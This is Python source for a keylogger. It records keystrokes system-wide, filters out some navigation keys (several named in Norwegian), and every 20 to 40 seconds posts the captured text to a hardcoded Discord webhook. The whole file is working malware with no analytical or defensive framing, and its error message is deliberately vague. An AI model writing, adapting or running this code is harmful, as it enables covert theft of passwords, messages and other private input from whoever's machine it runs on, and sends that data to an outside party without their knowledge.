import keyboard as k
import time as t
import requests as r
import threading as th
import random

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1261099917821214771/fIcCPl6wKWPVL7uNtA3qZt1UGjZj_TcBuOY6F7saJaqNQLx2NDwerk8M0BA4pqLF4YDg'

# Initialize an empty string to store captured keystrokes
keylogs_str = ''

# Function to send keylogs to Discord via webhook
def send_keylogs():
    global keylogs_str

    try:
        # Check if there are any keylogs to send
        if keylogs_str:
            # Create the payload for the webhook
            payload = {
                'content': keylogs_str
            }

            # Send the payload to the Discord webhook
            r.post(WEBHOOK_URL, data=payload)

            # Clear the keylogs string
            keylogs_str = ''
    except Exception as e:
        # Print error message without revealing too much detail
        print("Unknown error occurred. Please try again later.")

    # Schedule the next execution of the function after a random delay (between 30 and 38 seconds)
    delay = random.uniform(20, 40)  # Use uniform distribution for more randomness
    th.Timer(delay, send_keylogs).start()

# Function to capture keystrokes
def capture_keystrokes(event):
    global keylogs_str

    # Exclude certain keys from being captured
    excluded_keys = ["caps lock", "esc", "tab", "alt gr", "print screen", "ctrl", "skift", "back space",
                     "right shift", "alt", "pil ned", "pil opp", "pil høyre", "ctrl høyre", "pil venstre"
			"down", "num lock", "end", "left", "clear", "right", "page up", "home", "delete", 
			"insert", "prntsc", "venste windows", "høyre windows", "left arrow"]

    # If the key is in the excluded list, return without processing
    if event.name.lower() in excluded_keys:
        return

    # If the event is the backspace key, remove the last character
    if event.name == "backspace":
        if keylogs_str:
            keylogs_str = keylogs_str[:-1]
        return

    # Format special keys like space and enter correctly
    if event.name == "space":
        event.name = " "
    elif event.name == "enter":
        event.name = "\n"

    # Append the captured keystroke to the keylogs string
    keylogs_str += event.name

# Start capturing keystrokes
k.on_release(callback=capture_keystrokes)

# Start sending keylogs to Discord
send_keylogs()

# Keep the script running
try:
    while True:
        t.sleep(2)
except KeyboardInterrupt:
    print("Script terminated by user.")
